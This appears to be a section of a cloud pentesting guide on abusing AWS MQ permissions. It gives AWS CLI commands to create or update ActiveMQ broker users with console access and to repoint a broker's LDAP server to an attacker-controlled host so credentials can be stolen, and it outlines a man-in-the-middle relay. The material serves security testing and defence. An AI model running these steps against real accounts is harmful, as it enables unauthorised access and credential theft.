### `mq:ListBrokers`, `mq:CreateUser`

With those permissions you can **create a new user in an ActimeMQ broker** (this doesn't work in RabbitMQ):

```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```

**Potential Impact:** Access sensitive info navigating through ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

With those permissions you can **create a new user in an ActimeMQ broker** (this doesn't work in RabbitMQ):

```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```

**Potential Impact:** Access sensitive info navigating through ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

If a broker is using **LDAP** for authorization with **ActiveMQ**. It's possible to **change** the **configuration** of the LDAP server used to **one controlled by the attacker**. This way the attacker will be able to **steal all the credentials being sent through LDAP**.

```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```

If you could somehow find the original credentials used by ActiveMQ you could perform a MitM, steal the creds, used them in the original server, and send the response (maybe just reusing the crendetials stolen you could do this).

**Potential Impact:** Steal ActiveMQ credentials
